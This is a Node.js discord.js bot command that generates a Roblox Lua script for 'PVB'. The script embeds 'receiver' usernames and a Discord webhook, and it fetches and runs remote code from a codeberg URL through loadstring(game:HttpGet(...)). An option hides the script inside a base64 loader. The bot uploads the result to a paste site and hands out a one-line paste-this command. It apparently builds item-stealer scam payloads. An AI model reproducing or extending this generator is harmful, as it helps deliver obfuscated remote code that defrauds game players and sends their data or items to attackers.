const {
  SlashCommandBuilder,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle
} = require("discord.js");
const fetch = require("node-fetch");

// Upload helper for pastefy.app
async function uploadToPastefy(content) {
  const resp = await fetch("https://pastefy.app/documents", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: content
  });
  if (!resp.ok) throw new Error("Pastefy upload failed");
  const data = await resp.json().catch(() => null);
  return data && (data.key ? `https://pastefy.app/${data.key}` : null);
}

// convert multiline Lua script to single-line (mobile friendly)
function toSingleLine(lua) {
  return lua.replace(/\r\n|\n/g, "\\n").replace(/\s+/g, " ").trim();
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("gen-pvb")
    .setDescription("Generate PVB Lua paste + mobile copy button")
    .addStringOption(o =>
      o.setName("usernames").setDescription("Comma-separated usernames").setRequired(true)
    )
    .addStringOption(o =>
      o.setName("webhook").setDescription("Discord Webhook URL").setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName("moneypersecond").setDescription("Money per second").setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName("dmgpersecond").setDescription("Damage per second").setRequired(true)
    )
    .addBooleanOption(o =>
      o.setName("obfuscate").setDescription("Obfuscate (simple base64 loader)").setRequired(false)
    ),

  async execute(interaction) {
    try {
      await interaction.deferReply(); // para hindi mag timeout agad

      const usernamesRaw = interaction.options.getString("usernames");
      const usernames = usernamesRaw.split(",").map(s => s.trim()).filter(Boolean);
      if (usernames.length === 0) throw new Error("Please provide at least one username.");

      const webhook = interaction.options.getString("webhook");
      const money = interaction.options.getInteger("moneypersecond");
      const dmg = interaction.options.getInteger("dmgpersecond");
      const obf = interaction.options.getBoolean("obfuscate") ?? false;

      // Lua script
      const lua = `Usernames = {${usernames.map(u => `"${u}"`).join(", ")}}
Webhook = "${webhook}"

MoneyPerSecond = ${money}
DMGPerSecond = ${dmg}

loadstring(game:HttpGet("https://codeberg.org/aevithegreat/NoriScripts/raw/branch/main/PVB.lua"))()`;

      let finalLua = lua;

      // optional obfuscation
      if (obf) {
        const b64 = Buffer.from(lua, "utf8").toString("base64");
        finalLua = `
local function b64decode(s)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  s = s:gsub('[^'..b..'=]', '')
  local pad = 0
  if s:sub(-2) == '==' then pad = 2 elseif s:sub(-1) == '=' then pad = 1 end
  s = s:gsub('=+$', '')
  local t = {}
  for i = 1, #s, 4 do
    local n = 0
    for j = 0, 3 do
      local c = s:byte(i+j)
      if not c then break end
      n = n*64 + (b:find(string.char(c)) - 1)
    end
    for j = 16, 0, -8 do
      table.insert(t, string.char(math.floor(n / (2^j)) % 256))
    end
  end
  if pad > 0 then for i = 1, pad do table.remove(t) end end
  return table.concat(t)
end

local encoded = "${b64}"
local ok,decoded = pcall(b64decode, encoded)
if not ok then error('decode failed') end
local f,err = loadstring(decoded)
if not f then error(err or 'load failed') end
pcall(f)
`.trim();
      }

      // upload
      let pasteUrl = null;
      try {
        pasteUrl = await uploadToPastefy(finalLua);
      } catch (err) {
        console.warn("Paste upload error:", err.message);
      }

      const embed = new EmbedBuilder()
        .setTitle("YOUR PVB SCRIPT")
        .setColor(0x2f3136)
        .addFields({ name: "RECEIVERS", value: "```" + usernames.length + "```" });

      const desktopScript = pasteUrl
        ? `loadstring(game:HttpGet("${pasteUrl}"))()`
        : "Paste upload failed";

      embed.addFields({
        name: "SCRIPT (Desktop Friendly)",
        value: "```lua\n" + desktopScript + "\n```"
      });

      embed.setFooter({
        text: "💡 Mobile users: Tap the Copy (Mobile) button to get a single-line version."
      });

      const copyButton = new ButtonBuilder()
        .setCustomId("pvb_copy_mobile")
        .setLabel("Copy (Mobile)")
        .setStyle(ButtonStyle.Primary);

      const row = new ActionRowBuilder().addComponents(copyButton);

      const replyMsg = await interaction.editReply({
        embeds: [embed],
        components: [row],
        fetchReply: true
      });

      const mobileSingle = pasteUrl
        ? `loadstring(game:HttpGet("${pasteUrl}"))()`
        : toSingleLine(finalLua);

      const collector = replyMsg.createMessageComponentCollector({
        filter: i => i.user.id === interaction.user.id,
        time: 1000 * 60 * 10
      });

      collector.on("collect", async i => {
        if (i.customId === "pvb_copy_mobile") {
          await i.reply({ content: "```lua\n" + mobileSingle + "\n```", ephemeral: true });
        }
      });

      collector.on("end", () => {
        const disabledRow = new ActionRowBuilder().addComponents(copyButton.setDisabled(true));
        replyMsg.edit({ components: [disabledRow] }).catch(() => {});
      });
    } catch (err) {
      console.error("gen-pvb command failed:", err);
      if (!interaction.replied) {
        await interaction.reply({ content: `❌ Error: ${err.message}`, ephemeral: true });
      } else {
        await interaction.editReply({ content: `❌ Error: ${err.message}` });
      }
    }
  }
};
